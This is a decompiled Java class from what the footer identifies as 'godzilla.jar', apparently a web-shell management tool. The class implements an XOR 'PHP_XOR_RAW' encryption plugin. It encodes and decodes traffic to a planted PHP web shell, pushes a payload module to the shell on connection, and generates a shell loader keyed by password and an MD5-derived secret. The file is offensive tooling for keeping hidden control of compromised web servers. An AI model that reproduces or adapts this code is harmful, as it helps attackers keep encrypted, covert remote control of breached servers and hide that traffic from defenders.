/*    */ package shells.cryptions.phpXor;
/*    */ 
/*    */ import core.annotation.CryptionAnnotation;
/*    */ import core.imp.Cryption;
/*    */ import core.shell.ShellEntity;
/*    */ import util.Log;
/*    */ import util.functions;
/*    */ import util.http.Http;
/*    */ 
/*    */ @CryptionAnnotation(Name = "PHP_XOR_RAW", payloadName = "PhpDynamicPayload")
/*    */ public class PhpXorRaw
/*    */   implements Cryption {
/*    */   private ShellEntity shell;
/*    */   private Http http;
/*    */   private byte[] key;
/*    */   private boolean state;
/*    */   private byte[] payload;
/*    */   
/*    */   public void init(ShellEntity context) {
/* 20 */     this.shell = context;
/* 21 */     this.http = this.shell.getHttp();
/* 22 */     this.key = this.shell.getSecretKeyX().getBytes();
/*    */     try {
/* 24 */       this.shell.getHeaders().put("Content-Type", "application/octet-stream");
/* 25 */       this.payload = this.shell.getPayloadModule().getPayload();
/* 26 */       if (this.payload != null) {
/* 27 */         this.http.sendHttpResponse(this.payload);
/* 28 */         this.state = true;
/*    */       } else {
/* 30 */         Log.error("payload Is Null");
/*    */       }
/*    */     
/* 33 */     } catch (Exception e) {
/* 34 */       Log.error(e);
/*    */       return;
/*    */     } 
/*    */   }
/*    */ 
/*    */ 
/*    */   
/*    */   public byte[] encode(byte[] data) {
/*    */     try {
/* 43 */       return E(data);
/* 44 */     } catch (Exception e) {
/* 45 */       Log.error(e);
/* 46 */       return null;
/*    */     } 
/*    */   }
/*    */ 
/*    */ 
/*    */   
/*    */   public byte[] decode(byte[] data) {
/* 53 */     if (data != null && data.length > 0) {
/*    */       try {
/* 55 */         return D(data);
/* 56 */       } catch (Exception e) {
/* 57 */         Log.error(e);
/* 58 */         return null;
/*    */       } 
/*    */     }
/* 61 */     return data;
/*    */   }
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */   
/*    */   public boolean isSendRLData() {
/* 69 */     return false;
/*    */   }
/*    */   
/*    */   public byte[] E(byte[] cs) {
/* 73 */     int len = cs.length;
/* 74 */     for (int i = 0; i < len; i++) {
/* 75 */       cs[i] = (byte)(cs[i] ^ this.key[i + 1 & 0xF]);
/*    */     }
/* 77 */     return cs;
/*    */   }
/*    */   public byte[] D(byte[] cs) {
/* 80 */     int len = cs.length;
/* 81 */     for (int i = 0; i < len; i++) {
/* 82 */       cs[i] = (byte)(cs[i] ^ this.key[i + 1 & 0xF]);
/*    */     }
/* 84 */     return cs;
/*    */   }
/*    */ 
/*    */   
/*    */   public boolean check() {
/* 89 */     return this.state;
/*    */   }
/*    */ 
/*    */ 
/*    */   
/*    */   public byte[] generate(String password, String secretKey) {
/* 95 */     return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), true);
/*    */   }
/*    */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\cryptions\phpXor\PhpXorRaw.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */